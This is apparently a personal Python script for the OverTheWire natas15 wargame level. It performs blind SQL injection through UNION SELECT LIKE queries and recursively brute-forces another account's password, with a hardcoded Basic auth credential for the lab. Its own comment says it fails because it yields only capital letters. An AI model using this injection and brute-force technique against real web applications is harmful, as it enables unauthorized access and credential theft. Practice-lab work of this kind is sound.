#This script doesnt work (it gives the whole password as capitals)
import requests
url = "http://natas15.natas.labs.overthewire.org/"
headers = {"Authorization": "Basic bmF0YXMxNTpBd1dqMHc1Y3Z4clppT05nWjlKNXN0TlZrbXhkazM5Sg=="}

# res = requests.get(url, headers=headers)
# print(res.content)

#user query is actually unnessecary, can directly bruteforce password query
def createUserQuery(user):
	return "\" UNION SELECT * FROM users WHERE username LIKE \"" + user + "%"

def createUserRequest(user):
	return requests.post(url, headers=headers, data=dict(username=createUserQuery(user)))


def createPasswordQuery(password):
	return "\" UNION SELECT * FROM users WHERE username = \"natas16\" AND password LIKE \"" + password + "%"

def createPasswordRequest(password):
	return requests.post(url, headers=headers, data=dict(username=createPasswordQuery(password)))


res = requests.post(url, headers=headers, data=dict(username=createUserQuery("abdc")))
invalidUsername = createUserRequest("asdf").content

alphanumeric = '0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ'

def bruteForceUsername(username):
	print("Found new character in username: " + username)
	for char in alphanumeric:
		# if username == "" and char == "A" or char == "B": #skip alice
		# 	continue
		if createUserRequest(username + char).content != invalidUsername:
			bruteForceUsername(username + char)

def bruteForcePassword(password):
	print("Found new character in password: " + password)
	for char in alphanumeric:
		if createPasswordRequest(password + char).content != invalidUsername:
			return bruteForcePassword(password + char)

bruteForcePassword("")
